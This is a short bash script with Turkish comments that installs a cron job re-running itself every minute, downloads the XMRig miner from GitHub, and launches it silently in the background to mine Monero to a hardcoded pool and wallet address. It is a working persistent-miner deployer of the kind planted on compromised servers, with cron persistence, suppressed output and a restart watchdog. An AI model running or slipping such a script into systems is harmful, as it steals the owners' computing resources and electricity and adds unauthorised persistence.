#!/bin/bash

# Betiğin bulunduğu dizini belirle
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# XMRig'in tam yolu
XMRIG_PATH="$SCRIPT_DIR/xmrig-6.16.0/xmrig"

# XMRig dizininin tam yolu
XMRIG_DIR="$SCRIPT_DIR/xmrig-6.16.0"

# Cron job'unu ekle
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash $SCRIPT_DIR/rs.sh") | crontab -

# XMRig madencisini indir (sadece ilk seferde)
if [ ! -f xmrig-6.16.0-linux-x64.tar.gz ]; then
  if command -v wget >/dev/null 2>&1; then
    wget https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz
  elif command -v curl >/dev/null 2>&1; then
    curl -L -o xmrig-6.16.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.16.0/xmrig-6.16.0-linux-x64.tar.gz
  else
    echo "Hata: wget veya curl bulunamadı."
    exit 1
  fi
  tar -xvzf xmrig-6.16.0-linux-x64.tar.gz
  cd xmrig-6.16.0
  chmod +x xmrig
fi

# XMRig'i kontrol et ve başlat/yeniden başlat
if pgrep -x xmrig >/dev/null; then
  # XMRig çalışıyor, bir şey yapma
  sleep 60 # 60 saniye bekle
else
  # XMRig çalışmıyor, başlat
  cd "$XMRIG_DIR"
  "$XMRIG_PATH" -o pool.supportxmr.com:3333 -u 88NXbHvPdph8KkXhSbou43iLmbo7MrpBp6nycitmj2rCR1tkfN2kEAcHMiHd2zZMgy7VtRj6T5p4dDhNMB2UzwHwPiiSHcN -p x -B > /dev/null 2>&1
  sleep 5 # Yeniden başlatmadan önce 5 saniye bekle
fi

# Betiği kapat
exit 0
